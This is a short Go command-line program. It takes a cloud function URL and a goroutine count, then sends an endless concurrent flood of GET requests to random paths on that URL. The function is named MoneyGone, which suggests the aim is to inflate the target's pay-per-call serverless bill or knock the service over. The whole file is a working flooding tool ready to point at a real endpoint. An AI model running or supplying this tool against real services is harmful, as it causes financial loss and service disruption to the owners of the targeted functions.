package main

import (
	"flag"
	"fmt"
	"github.com/niudaii/util"
	"net/http"
	"sync"
	"time"
)

func main() {
	C2FApi := flag.String("url","","-url   云函数地址")
	CoroutineControl := flag.Int("speed",100,"设置协程数量，默认为100")
	flag.Parse()
	if *C2FApi == "" {
		fmt.Println("url不能为空")
		return
	}

	MoneyGone(C2FApi,CoroutineControl)
}

func MoneyGone(C2FApi *string , CoroutineControl *int){

	_, err := http.Get(*C2FApi)
	if err != nil{
		fmt.Println("no such host")
		return
	}

	client := http.Client{
		Timeout: 100 * time.Millisecond,
	}
	var wg sync.WaitGroup
	ch := make(chan struct{}, *CoroutineControl)
	for {
		ch <- struct{}{}
		wg.Add(1)
		go func() {
			defer wg.Done()
			randURL := *C2FApi+"/"+ util.RandomString(10)
			_,_ = client.Get(randURL)
			time.Sleep(100*time.Millisecond)
			fmt.Println(time.Now()," [*] GET ",randURL)
			<-ch
		}()
	}
}


